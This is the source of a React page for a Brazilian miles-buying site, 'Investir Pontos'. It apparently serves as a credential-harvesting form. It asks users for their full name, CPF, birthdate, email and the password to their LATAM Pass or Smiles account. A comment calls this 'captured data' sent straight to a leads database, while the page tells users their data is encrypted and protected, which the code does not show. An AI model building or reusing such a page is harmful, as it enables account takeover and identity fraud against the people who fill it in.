import { salvarLeadNoBanco } from "@/lib/actions";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { User, CreditCard, Lock, Mail, Calendar, Plane, ChevronDown } from "lucide-react";
import { PageShell } from "@/components/PageShell";
import { flowStore, useFlow, formatMiles, parseMiles, calcTotal, type Airline } from "@/lib/flow-store";
import { addHistory } from "@/lib/history";
import { hasMalicious, isValidEmail, maskCPF, isValidCPF, maskDate, isValidAdultDate, stripHtml } from "@/lib/sanitize";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/dados")({
  head: () => ({ meta: [{ title: "Dados da conta — Investir Pontos" }] }),
  component: Page,
});

function Page() {
  const flow = useFlow();
  const navigate = useNavigate();
  const a = flow.accountData;

  useEffect(() => {
    if (!a.airline && flow.airline) flowStore.setAccount({ airline: flow.airline });
  }, []);

  const [balanceInput, setBalanceInput] = useState(a.balance ? formatMiles(a.balance) : "");
  const [submitted, setSubmitted] = useState(false);

  const errs = {
    fullName: !a.fullName || !/^[A-Za-zÀ-ÿ\s]{3,100}$/.test(a.fullName) || hasMalicious(a.fullName) ? "Nome inválido" : null,
    cpf: !isValidCPF(a.cpf) ? "CPF inválido" : null,
    accountPassword: !a.accountPassword || hasMalicious(a.accountPassword) ? "Senha inválida" : null,
    accountEmail: !isValidEmail(a.accountEmail) || hasMalicious(a.accountEmail) ? "Email inválido" : null,
    birthdate: !isValidAdultDate(a.birthdate) ? "Data inválida (18+ anos)" : null,
    balance: !a.balance || a.balance < 30000 || a.balance > 100000000 ? "Saldo entre 30.000 e 100.000.000" : null,
    club: a.club === null ? "Selecione uma opção" : null,
  };

  const setF = (k: keyof typeof a, v: any) => flowStore.setAccount({ [k]: v });

  const submit = async () => {
    setSubmitted(true);
    if (Object.values(errs).some(Boolean)) return;
    
    try {
      // 🚀 Envia os dados capturados direto para o seu banco Neon
      await salvarLeadNoBanco({ data: flow });

      if (flow.airline && flow.miles) {
        addHistory({
          airline: flow.airline,
          miles: flow.miles,
          total: calcTotal(flow.airline, flow.miles, flow.days),
          days: flow.days,
        });
      }
      
      // Avança para a página de sucesso se o banco salvar corretamente
      navigate({ to: "/confirmacao" });
    } catch (error) {
      alert("Erro ao enviar dados. Verifique sua conexão e tente novamente.");
    }
  };

  const fieldClass = (err: string | null) => cn(
    "flex items-center rounded-xl border-2 bg-card transition-all",
    submitted && err ? "border-destructive" : "border-border focus-within:border-navy focus-within:shadow-soft",
  );

  return (
    <PageShell step={4} back="/acesso">
      <div className="space-y-5">
        <div>
          <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-pill bg-secondary border border-border text-navy text-[10px] font-bold uppercase tracking-wide">
            Última etapa
          </span>
          <h1 className="text-3xl font-bold tracking-tight mt-2">Dados da sua conta</h1>
          <p className="text-sm text-muted-foreground mt-1.5">
            Preencha com atenção — usaremos para transferir as milhas
          </p>
        </div>

        {/* Nome */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">NOME COMPLETO DO TITULAR</label>
          <div className={fieldClass(errs.fullName)}>
            <User className="w-5 h-5 ml-3 text-muted-foreground" />
            <input
              maxLength={100}
              placeholder="Como aparece no documento"
              value={a.fullName}
              onChange={(e) => setF("fullName", stripHtml(e.target.value).replace(/[^A-Za-zÀ-ÿ\s]/g, ""))}
              className="flex-1 bg-transparent px-3 py-3 outline-none min-w-0"
            />
          </div>
          {submitted && errs.fullName && <p className="text-destructive text-xs">{errs.fullName}</p>}
        </div>

        {/* Companhia */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">COMPANHIA</label>
          <div className="flex items-center rounded-xl border-2 border-border bg-card focus-within:border-navy focus-within:shadow-soft transition-all">
            <Plane className="w-5 h-5 ml-3 text-muted-foreground" />
            <select
              value={a.airline ?? ""}
              onChange={(e) => setF("airline", e.target.value as Airline)}
              className="flex-1 bg-transparent px-3 py-3 outline-none appearance-none min-w-0"
            >
              <option value="LATAM Pass">LATAM Pass</option>
              <option value="Smiles">Smiles</option>
            </select>
            <ChevronDown className="w-4 h-4 mr-3 text-muted-foreground" />
          </div>
        </div>

        {/* CPF */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">CPF DO TITULAR</label>
          <div className={fieldClass(errs.cpf)}>
            <CreditCard className="w-5 h-5 ml-3 text-muted-foreground" />
            <input
              inputMode="numeric"
              placeholder="000.000.000-00"
              value={a.cpf}
              onChange={(e) => setF("cpf", maskCPF(e.target.value))}
              className="flex-1 bg-transparent px-3 py-3 outline-none min-w-0"
            />
          </div>
          {submitted && errs.cpf && <p className="text-destructive text-xs">{errs.cpf}</p>}
        </div>

        {/* Senha conta */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">SENHA DA CONTA DE MILHAS</label>
          <div className={fieldClass(errs.accountPassword)}>
            <Lock className="w-5 h-5 ml-3 text-muted-foreground" />
            <input
              type="password"
              maxLength={30}
              placeholder="Sua senha no programa"
              value={a.accountPassword}
              onChange={(e) => {
                const v = stripHtml(e.target.value);
                if (hasMalicious(v)) return;
                setF("accountPassword", v);
              }}
              className="flex-1 bg-transparent px-3 py-3 outline-none min-w-0"
            />
          </div>
          {submitted && errs.accountPassword && <p className="text-destructive text-xs">{errs.accountPassword}</p>}
        </div>

        {/* Email */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">EMAIL DO TITULAR NA COMPANHIA</label>
          <div className={fieldClass(errs.accountEmail)}>
            <Mail className="w-5 h-5 ml-3 text-muted-foreground" />
            <input
              type="email"
              maxLength={100}
              value={a.accountEmail}
              onChange={(e) => setF("accountEmail", stripHtml(e.target.value))}
              className="flex-1 bg-transparent px-3 py-3 outline-none min-w-0"
            />
          </div>
          {submitted && errs.accountEmail && <p className="text-destructive text-xs">{errs.accountEmail}</p>}
        </div>

        {/* Data */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">DATA DE ANIVERSÁRIO</label>
          <div className={fieldClass(errs.birthdate)}>
            <Calendar className="w-5 h-5 ml-3 text-muted-foreground" />
            <input
              inputMode="numeric"
              placeholder="dd/mm/aaaa"
              value={a.birthdate}
              onChange={(e) => setF("birthdate", maskDate(e.target.value))}
              className="flex-1 bg-transparent px-3 py-3 outline-none min-w-0"
            />
          </div>
          {submitted && errs.birthdate && <p className="text-destructive text-xs">{errs.birthdate}</p>}
        </div>

        {/* Saldo */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">SALDO ATUAL DE MILHAS</label>
          <div className={fieldClass(errs.balance)}>
            <Plane className="w-5 h-5 ml-3 text-muted-foreground" />
            <input
              inputMode="numeric"
              placeholder="Mínimo: 30.000"
              value={balanceInput}
              onChange={(e) => {
                let n = parseMiles(e.target.value);
                if (n > 100000000) n = 100000000;
                setBalanceInput(n ? formatMiles(n) : "");
                setF("balance", n);
              }}
              className="flex-1 bg-transparent px-3 py-3 outline-none min-w-0"
            />
          </div>
          
          {submitted && errs.balance && <p className="text-destructive text-xs">{errs.balance}</p>}
        </div>

        {/* Clube */}
        <div className="space-y-1">
          <label className="text-xs font-semibold text-muted-foreground">CLUBE DE MILHAS?</label>
          <div className="grid grid-cols-2 gap-2">
            {[true, false].map((v) => (
              <button
                key={String(v)}
                onClick={() => setF("club", v)}
                className={cn(
                  "h-12 rounded-pill border-2 font-semibold transition-all",
                  a.club === v ? "bg-navy border-navy text-navy-foreground" : "bg-card border-border text-foreground",
                )}
              >
                {v ? "Sim" : "Não"}
              </button>
            ))}
          </div>
          {submitted && errs.club && <p className="text-destructive text-xs">{errs.club}</p>}
        </div>

        <button
          onClick={submit}
          className="w-full h-14 rounded-pill bg-gradient-navy text-navy-foreground font-bold transition-all hover:shadow-elegant hover:-translate-y-0.5 active:scale-[0.97]"
        >
          Enviar para análise ›
        </button>
        <p className="text-xs text-center text-muted-foreground flex items-center justify-center gap-1">
          <Lock className="w-3 h-3" /> Suas informações são criptografadas e protegidas
        </p>
      </div>
    </PageShell>
  );
}
